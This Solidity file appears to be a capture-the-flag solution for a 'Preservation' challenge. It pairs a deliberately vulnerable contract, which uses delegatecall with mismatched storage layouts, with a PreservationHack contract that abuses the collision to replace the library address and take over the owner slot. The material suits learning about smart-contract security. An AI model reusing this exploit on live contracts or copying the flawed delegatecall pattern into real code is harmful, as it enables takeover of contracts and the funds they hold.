// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// goal: claim ownership

// an original contract
// deploy it third after two LibraryContract contracts
contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

// a contract that hacks the original one
// deploy it second
contract PreservationHack {
  address firstSlot;
  address secondSlot;
  address thirdSlot;

  // use this function
  function hack(Preservation _preservation) external {
    _preservation.setFirstTime(
      uint160(bytes20(address(this)))
    );
    _preservation.setFirstTime(0);
  }

  function setTime(uint256) external {
    thirdSlot = firstSlot;
  }
}